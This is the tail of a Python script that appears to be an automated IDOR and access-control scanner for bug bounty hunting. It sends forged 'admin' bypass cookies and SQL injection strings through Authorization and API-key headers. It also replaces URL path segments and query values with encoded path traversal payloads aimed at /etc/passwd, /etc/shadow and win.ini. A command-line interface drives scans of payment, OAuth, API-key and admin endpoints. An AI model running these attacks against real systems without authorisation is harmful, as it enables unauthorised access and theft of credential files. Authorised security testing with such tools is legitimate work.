                # Test 4: With common bypass cookies
                bypass_cookies = {
                    'session': 'admin',
                    'user_id': 'admin',
                    'userid': 'admin',
                    'uid': 'admin',
                    'id': 'admin',
                    'auth': 'true',
                    'authenticated': 'true',
                    'logged_in': 'true',
                    'admin': 'true',
                    'role': 'admin',
                    'is_admin': 'true',
                    'isAdmin': 'true'
                }
                
                futures.append(executor.submit(
                    self._test_auth_scenario,
                    url=endpoint,
                    cookies=bypass_cookies,
                    headers=self.headers,
                    description="Bypass cookies test"
                ))
                
                # Test 5: With SQL injection in auth
                sqli_auth = [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' OR 'a'='a",
                    "' OR 1=1#",
                    "' OR 1=1/*",
                    "admin'--",
                    "admin'#",
                    "admin'/*"
                ]
                
                for sqli in sqli_auth:
                    sqli_headers = self.headers.copy()
                    sqli_headers.update({
                        'Authorization': f'Bearer {sqli}',
                        'X-Auth-Token': sqli,
                        'X-API-Key': sqli
                    })
                    futures.append(executor.submit(
                        self._test_auth_scenario,
                        url=endpoint,
                        cookies={},
                        headers=sqli_headers,
                        description=f"SQLi auth test: {sqli}"
                    ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "HIGH"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in auth bypass test: {str(e)}[/yellow]")

    def _test_auth_scenario(self, url, cookies, headers, description):
        """Test a specific authentication scenario"""
        try:
            response = requests.get(
                url,
                headers=headers,
                cookies=cookies,
                proxies=self.proxy,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            return self._check_response_for_vulnerability(response, description)
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error in auth scenario test: {str(e)}[/yellow]")
            return None

    def _test_batch_payload(self, url, payload, description):
        """Test a batch operation with a specific payload"""
        try:
            response = requests.post(
                url,
                json=payload,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxy,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            return self._check_response_for_vulnerability(response, description)
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error in batch payload test: {str(e)}[/yellow]")
            return None

    def _test_webhook_payload(self, url, payload, description):
        """Test a webhook endpoint with a specific payload"""
        try:
            response = requests.post(
                url,
                json=payload,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxy,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            return self._check_response_for_vulnerability(response, description)
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error in webhook payload test: {str(e)}[/yellow]")
            return None

    def _test_oauth_payload(self, url, payload, description):
        """Test an OAuth endpoint with a specific payload"""
        try:
            response = requests.post(
                url,
                json=payload,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxy,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            return self._check_response_for_vulnerability(response, description)
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error in OAuth payload test: {str(e)}[/yellow]")
            return None

    def _test_json_payload(self, url, payload, description):
        """Test an endpoint with a JSON payload"""
        try:
            response = requests.post(
                url,
                json=payload,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxy,
                verify=self.verify_ssl,
                timeout=self.timeout
            )
            
            return self._check_response_for_vulnerability(response, description)
            
        except Exception as e:
            if self.verbose:
                console.print(f"[yellow]Error in JSON payload test: {str(e)}[/yellow]")
            return None

    def _test_advanced_path_traversal(self, endpoints):
        """Test for advanced path traversal techniques"""
        if self.verbose:
            console.print("[bold blue]Testing for advanced path traversal techniques...[/bold blue]")
        
        # Advanced path traversal payloads
        advanced_payloads = [
            # Double encoding
            "%252e%252e%252f", "%252e%252e%255c", "%252e%252e%252f%252e%252e%252f",
            "%252e%252e%255c%252e%252e%255c", "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
            # Triple encoding
            "%25252e%25252e%25252f", "%25252e%25252e%25255c",
            # Mixed slashes
            "..\\", "..\\..\\", "..\\..\\..\\", "..\\..\\..\\..\\",
            "..\\..\\..\\..\\..\\", "..\\..\\..\\..\\..\\..\\",
            # Dotless traversal
            "%2e%2e%2f", "%2e%2e%5c", "%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
            # Mixed encoding
            "..%2f..%5c..%2f..%5c", "%2e%2e%2f..%5c%2e%2e%2f",
            # URL encoding variations
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c",
            # Windows path traversal
            "..\\..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            # Unix path traversal
            "../../../../etc/passwd", "../../../../etc/shadow", "../../../../etc/hosts",
            # Mixed path traversal
            "..\\..\\..\\..\\etc\\passwd", "..\\..\\..\\..\\etc\\shadow",
            # Encoded sensitive files
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            # Double encoded sensitive files
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for endpoint in endpoints:
                url_parts = urlparse(endpoint)
                path_parts = url_parts.path.split('/')
                
                # Test each path segment with advanced traversal payloads
                for i, part in enumerate(path_parts):
                    if part and part not in ['', 'http:', 'https:']:
                        for payload in advanced_payloads:
                            # Create modified path with traversal payload
                            new_path_parts = path_parts.copy()
                            new_path_parts[i] = payload
                            new_path = '/'.join(new_path_parts)
                            
                            new_url = url_parts._replace(path=new_path).geturl()
                            
                            futures.append(executor.submit(
                                self._test_url_for_idor,
                                original_url=endpoint,
                                modified_url=new_url,
                                description=f"Advanced path traversal: replaced '{part}' with '{payload}'"
                            ))
                            
                            # Also test appending the payload
                            new_path_parts = path_parts.copy()
                            new_path_parts[i] = part + payload
                            new_path = '/'.join(new_path_parts)
                            
                            new_url = url_parts._replace(path=new_path).geturl()
                            
                            futures.append(executor.submit(
                                self._test_url_for_idor,
                                original_url=endpoint,
                                modified_url=new_url,
                                description=f"Advanced path traversal: appended '{payload}' to '{part}'"
                            ))
                
                # Test with payloads in query parameters
                query_params = parse_qs(url_parts.query)
                for param, values in query_params.items():
                    for payload in advanced_payloads[:10]:  # Limit to avoid too many requests
                        new_params = query_params.copy()
                        new_params[param] = [payload]
                        
                        new_query = urlencode(new_params, doseq=True)
                        new_url = url_parts._replace(query=new_query).geturl()
                        
                        futures.append(executor.submit(
                            self._test_url_for_idor,
                            original_url=endpoint,
                            modified_url=new_url,
                            description=f"Advanced traversal in query: changed '{param}' to '{payload}'"
                        ))
            
            # Process results
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        result["severity"] = "HIGH"
                        self.findings.append(result)
                except Exception as e:
                    if self.verbose:
                        console.print(f"[yellow]Error in advanced path traversal test: {str(e)}[/yellow]")

def main():
    parser = argparse.ArgumentParser(description='Advanced IDOR Vulnerability Testing Script for Bug Bounty Hunting')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-c', '--cookies', help='Cookies to include with requests (format: key1=value1; key2=value2)')
    parser.add_argument('-H', '--headers', action='append', help='Headers to include with requests (format: Header: Value)')
    parser.add_argument('-i', '--ids', help='Comma-separated list of IDs to test (e.g., 1,2,admin,user5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('-p', '--proxy', help='Proxy to use (format: http://127.0.0.1:8080)')
    parser.add_argument('-o', '--output', help='Output file for results (JSON format)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads')
    parser.add_argument('--jwt', help='JWT token to manipulate for testing')
    parser.add_argument('--graphql', action='store_true', help='Enable GraphQL-specific IDOR testing')
    
    # Enhanced high-value testing options
    parser.add_argument('--sequential', action='store_true', help='Test sequential IDs (1-20, 100-120, 1000-1020)')
    parser.add_argument('--common-ids', action='store_true', help='Test common high-value IDs (admin, root, system, etc.)')
    parser.add_argument('--privileged', action='store_true', help='Test privileged endpoints (admin, management, etc.)')
    parser.add_argument('--batch', action='store_true', help='Test batch operations for IDOR')
    parser.add_argument('--webhooks', action='store_true', help='Test webhook endpoints for IDOR')
    parser.add_argument('--files', action='store_true', help='Test file operations for IDOR')
    parser.add_argument('--admin', action='store_true', help='Test admin functions for IDOR')
    parser.add_argument('--payment', action='store_true', help='Test payment endpoints for IDOR')
    parser.add_argument('--api-keys', action='store_true', help='Test API key endpoints for IDOR')
    parser.add_argument('--oauth', action='store_true', help='Test OAuth endpoints for IDOR')
    
    # Enable all high-value tests
    parser.add_argument('--all-high-value', action='store_true', help='Enable all high-value IDOR tests')
    
    # Advanced testing options
    parser.add_argument('--advanced-traversal', action='store_true', help='Enable advanced path traversal testing (double encoding, mixed slashes, dotless)')
    
    args = parser.parse_args()
    
    # Enable all high-value tests if --all-high-value is specified
    if args.all_high_value:
        args.sequential = True
        args.common_ids = True
        args.privileged = True
        args.batch = True
        args.webhooks = True
        args.files = True
        args.admin = True
        args.payment = True
        args.api_keys = True
        args.oauth = True
        args.advanced_traversal = True
    
    try:
        tester = IDORTester(args)
        tester.run()
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()